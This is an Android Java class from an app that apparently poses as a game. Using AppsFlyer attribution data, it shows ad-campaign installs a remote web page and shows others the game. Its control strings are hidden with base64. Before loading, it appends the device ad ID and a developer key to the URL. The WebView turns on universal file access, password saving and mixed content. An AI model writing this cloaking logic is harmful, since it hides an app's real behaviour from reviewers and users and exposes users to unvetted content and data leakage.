package com.nneo.srta;

import android.content.Intent;
import android.util.Log;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;

import com.appsflyer.AppsFlyerConversionListener;

import java.util.Map;
import java.util.Objects;

public class WebClass extends NS {

    public String paramsNnneoSrta;
    ParsLine parsLineNnneoSrta = new ParsLine();

    AppsFlyerConversionListener conversionListenerNnneoSrta = new AppsFlyerConversionListener() {
        @Override
        public void onConversionDataSuccess(Map<String, Object> conversionDataMapNnneoSrta) {
            for (String attrName : conversionDataMapNnneoSrta.keySet())

            statusAppsFlyerNnneoSrta = Objects.requireNonNull(conversionDataMapNnneoSrta.get(Decoder11("YWZfc3RhdHVz"))).toString();

            if (statusAppsFlyerNnneoSrta.equals(Decoder11("Tm9uLW9yZ2FuaWM="))) {
                String statusCampaignNnneoSrta = Objects.requireNonNull(conversionDataMapNnneoSrta.get(Decoder11("Y2FtcGFpZ24="))).toString();
                paramsNnneoSrta = parsLineNnneoSrta.ChangeLine(statusCampaignNnneoSrta);
            }
        }

        @Override
        public void onConversionDataFail(String s) {

        }

        @Override
        public void onAppOpenAttribution(Map<String, String> map) {

        }

        @Override
        public void onAttributionFailure(String s) {

        }
    };

    public void getWeb(WebView webViewNnneoSrta, String linkNnneoSrta) {
        webViewNnneoSrta.setVisibility(View.VISIBLE);
        webViewNnneoSrta.getSettings().setJavaScriptEnabled(true);
        webViewNnneoSrta.getSettings().setAppCacheEnabled(true);
        webViewNnneoSrta.getSettings().setDomStorageEnabled(true);
        webViewNnneoSrta.getSettings().setAllowContentAccess(true);
        webViewNnneoSrta.getSettings().setAllowFileAccess(true);
        webViewNnneoSrta.getSettings().setAppCacheEnabled(true);
        webViewNnneoSrta.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewNnneoSrta.getSettings().setSaveFormData(true);
        webViewNnneoSrta.getSettings().setMixedContentMode(0);
        webViewNnneoSrta.getSettings().setSavePassword(true);
        webViewNnneoSrta.getSettings().setAllowContentAccess(true);
        webViewNnneoSrta.getSettings().setLoadsImagesAutomatically(true);
        webViewNnneoSrta.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewNnneoSrta.getSettings().setDatabaseEnabled(true);
        webViewNnneoSrta.getSettings().setLoadWithOverviewMode(true);
        webViewNnneoSrta.getSettings().setUseWideViewPort(true);
        webViewNnneoSrta.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewNnneoSrta.getSettings().setDomStorageEnabled(true);
        webViewNnneoSrta.getSettings().setAllowFileAccess(true);
        webViewNnneoSrta.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewNnneoSrta.getSettings().setEnableSmoothTransition(true);
        webViewNnneoSrta.loadUrl(linkNnneoSrta);
    }

    public void oneSignal(NS NSNnneoSrta) {
        com.onesignal.OneSignal.setLogLevel(com.onesignal.OneSignal.LOG_LEVEL.VERBOSE, com.onesignal.OneSignal.LOG_LEVEL.NONE);
        com.onesignal.OneSignal.initWithContext(NSNnneoSrta);
        com.onesignal.OneSignal.setAppId(Decoder11(ONESIGNAL_APP_ID_NNEO_SRTA));
    }


    public void StartWebView(String linkNnneoSrta, String keyLinkNnneoSrta, WebView webViewNnneoSrta,
                             String fbDataNnneoSrta, NS nsNnneoSrta) {

        if (statusAppsFlyerNnneoSrta.equals(Decoder11("Tm9uLW9yZ2FuaWM="))) {
            String loadNnneoSrta = (linkNnneoSrta + paramsNnneoSrta);

            getWeb(webViewNnneoSrta, loadNnneoSrta);
        } else if (fbDataNnneoSrta != null) {
            String loadNnneoSrta = (linkNnneoSrta + fbDataNnneoSrta);

            getWeb(webViewNnneoSrta, loadNnneoSrta);
        } else {
            if (keyLinkNnneoSrta.equals(Decoder11("Tk8="))) {

                Intent intentNnneoSrta = new Intent(nsNnneoSrta.getApplicationContext(), GameActivity.class);
                nsNnneoSrta.startActivity(intentNnneoSrta);
            } else {
                paramsNnneoSrta = (keyLinkNnneoSrta + Decoder11("P2J1bmRsZT0=") + Decoder11(packageNameNnneoSrta) +
                        Decoder11("JmFkX2lkPQ==") + NS.adIdNnneoSrta + Decoder11("JmFwcHNfaWQ9") +
                        NS.apps_idNnneoSrta + Decoder11("JmRldl9rZXk9") + Decoder11(AF_DEV_KEY_NNEO_SRTA));
                String loadNnneoSrta = linkNnneoSrta + paramsNnneoSrta;

                getWeb(webViewNnneoSrta, loadNnneoSrta);

            }
        }
    }
}
